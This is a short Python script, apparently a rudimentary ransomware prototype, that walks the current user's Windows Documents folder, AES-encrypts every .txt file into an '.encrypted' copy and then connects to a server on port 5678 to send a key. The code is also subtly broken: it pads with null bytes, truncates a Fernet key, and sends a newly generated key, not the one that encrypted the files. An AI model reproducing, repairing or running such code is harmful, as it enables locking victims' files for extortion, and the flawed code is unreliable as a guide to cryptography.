from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import socket
import getpass

username = getpass.getuser()  # get the username of the current user
path = "C:/Users/"+username+"/Documents"


def encrypt_file(key, input_file):
    # Generate a random 16-byte IV
    iv = os.urandom(16)
    
    # Create an AES cipher object with the key and IV
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    
    # Read the contents of the input file to be encrypted
    with open(input_file, 'rb') as f:
        data = f.read()
    
    # Pad the data to a multiple of 16 bytes
    padded_data = data + b"\0" * (16 - len(data) % 16)
    
    # Encrypt the data
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    
    # Write the encrypted data to a new file
    output_file = input_file + '.encrypted'
    with open(output_file, 'wb') as f:
        f.write(iv + encrypted_data)
    
    return output_file

# Generate a random key
# Get the username of the current user
username = os.getlogin()

# Set the path to the Documents folder
documents_path = os.path.join("C:/Users", username, "Documents")

# Generate a random key
key_size = 16  # 128 bits
key = Fernet.generate_key()
key = key[:key_size]

# Loop through all TXT files in the Documents folder and its subfolders, and encrypt them
for root, dirs, files in os.walk(documents_path):
    for filename in files:
        if filename.endswith('.txt'):
            input_file = os.path.join(root, filename)
            output_file = encrypt_file(key, input_file)
            print('Encrypted file:', output_file)

print('Input file:', input_file)
print('Output file:', output_file)
print('Key:', key)


SERVER_IP = 'localhost'
SERVER_PORT = 5678

# Generate a random key
key_size = 16  # 128 bits
key = Fernet.generate_key()
key= key[:key_size]
with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))
    data = s.recv(1024)
    print(data)
    s.send(key)